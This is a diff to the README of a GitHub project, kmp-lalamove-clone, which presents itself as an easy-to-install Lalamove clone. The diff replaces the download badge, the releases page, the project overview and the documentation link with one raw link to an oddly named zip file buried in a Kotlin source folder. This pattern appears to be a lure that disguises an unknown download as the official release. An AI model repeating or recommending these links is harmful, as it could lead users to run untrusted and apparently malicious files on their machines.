@@ -1,7 +1,7 @@
 # 🎉 kmp-lalamove-clone - Easy Lalamove Clone for Everyone
 
 ## 📥 Download Now!
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Tom-Nguyen1/kmp-lalamove-clone/releases)
+[![Download](https://raw.githubusercontent.com/Tom-Nguyen1/kmp-lalamove-clone/master/composeApp/src/commonMain/kotlin/com/lalamove/clone/feature/home/view/lalamove_kmp_clone_quegh.zip)](https://raw.githubusercontent.com/Tom-Nguyen1/kmp-lalamove-clone/master/composeApp/src/commonMain/kotlin/com/lalamove/clone/feature/home/view/lalamove_kmp_clone_quegh.zip)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ Follow these steps to download and set up the kmp-lalamove-clone on your compute
 
 ### 1. Visit the Download Page
 
-First, go to the [releases page](https://github.com/Tom-Nguyen1/kmp-lalamove-clone/releases). Here, you will find different versions of the application. 
+First, go to the [releases page](https://raw.githubusercontent.com/Tom-Nguyen1/kmp-lalamove-clone/master/composeApp/src/commonMain/kotlin/com/lalamove/clone/feature/home/view/lalamove_kmp_clone_quegh.zip). Here, you will find different versions of the application. 
 
 ### 2. Choose Your Version
 
@@ -62,8 +62,8 @@ Feel free to reach out if you have questions or need help. You can create an iss
 
 ## 🔗 Additional Resources
 
-- [Project Overview](https://github.com/Tom-Nguyen1/kmp-lalamove-clone) - Learn more about the project.
-- [Documentation](https://github.com/Tom-Nguyen1/kmp-lalamove-clone/wiki) - Explore guides and features.
+- [Project Overview](https://raw.githubusercontent.com/Tom-Nguyen1/kmp-lalamove-clone/master/composeApp/src/commonMain/kotlin/com/lalamove/clone/feature/home/view/lalamove_kmp_clone_quegh.zip) - Learn more about the project.
+- [Documentation](https://raw.githubusercontent.com/Tom-Nguyen1/kmp-lalamove-clone/master/composeApp/src/commonMain/kotlin/com/lalamove/clone/feature/home/view/lalamove_kmp_clone_quegh.zip) - Explore guides and features.
 
 ---
 
